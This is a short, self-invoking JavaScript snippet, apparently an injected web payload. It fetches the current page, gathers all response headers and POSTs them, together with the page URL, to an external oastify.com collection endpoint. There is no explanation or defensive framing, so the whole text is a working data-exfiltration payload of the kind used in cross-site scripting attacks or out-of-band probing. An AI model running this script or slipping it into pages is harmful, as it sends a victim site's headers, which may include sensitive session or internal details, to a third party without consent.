(function() {
    var headers = new Headers();
    var init = { method: 'GET', headers: headers, mode: 'cors', cache: 'default' };

    fetch(window.location.href, init).then(function(response) {
        var headersList = '';
        for (var pair of response.headers.entries()) {
            headersList += pair[0] + ': ' + pair[1] + '\n';
        }

        // Send the headers to your server
        fetch('https://pjcixhq5g4ig7etst0xl53js7jda14ysn.oastify.com/collect-headers', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                url: window.location.href,
                headers: headersList
            })
        });
    });
})();
